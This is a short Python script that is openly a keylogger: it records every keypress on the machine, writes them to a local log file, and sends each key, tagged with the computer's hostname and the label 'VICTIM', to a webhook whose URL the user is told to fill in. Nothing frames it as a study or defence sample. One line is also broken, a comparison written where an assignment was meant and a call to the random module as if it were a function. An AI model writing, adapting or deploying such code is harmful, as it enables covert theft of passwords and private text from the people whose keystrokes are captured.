import random
from pynput.keyboard import Key, Listener
from dhooks import Webhook
import logging
import socket


host = socket.gethostname()
log_dir = ""
if host == "":
    host == random(5)

# Replace PLACEHOLDER with your Webhook-url !
log_send = Webhook('PLACEHOLDER')

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

    print(key)

    # Output will be VICTIM : "PC USERNAME" = 'KEY'
    log_send.send("VICTIM : "+" **"+host+"** ="+str(key)+"\n")

with Listener(on_press=on_press) as listener:
    listener.join()